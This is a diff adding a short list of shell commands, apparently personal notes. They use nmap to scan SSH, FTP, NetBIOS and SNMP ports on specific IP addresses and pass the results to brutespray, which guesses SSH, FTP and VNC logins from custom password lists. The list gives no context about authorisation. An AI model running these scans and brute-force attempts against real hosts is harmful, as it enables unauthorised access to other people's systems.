@@ -1,0 +1,16 @@
+nmap -sVTU -p21,22,137,161 157.240.20 139.99.172.99 -oG ts.gnmap
+nmap -sVTU -p21,22,137,161 157.240.20 -oG ts.gnmap
+
+cat filename.gnmap
+cat ts.gnmap
+
+./brutespray.py --modules
+./brutespray.py --file ts.gnmap -i
+./brutespray.py --file ts.gnmap --service ssh
+./brutespray.py --file ts.gnmap --service ssh
+ls -F wordlist/
+cp /path/to/customPasswords.list wordlist/ssh/password
+cp /path/to/customUser.list wordlist/vnc/user
+./brutespray.py --file filename.gnmap --username UsernameHere --passlist /path/to/desired/passwords.list --service ftp
+
+./brutespray.py --file ts.gnmap --passlist /root/to/Desktop/passwords.list --service ftp
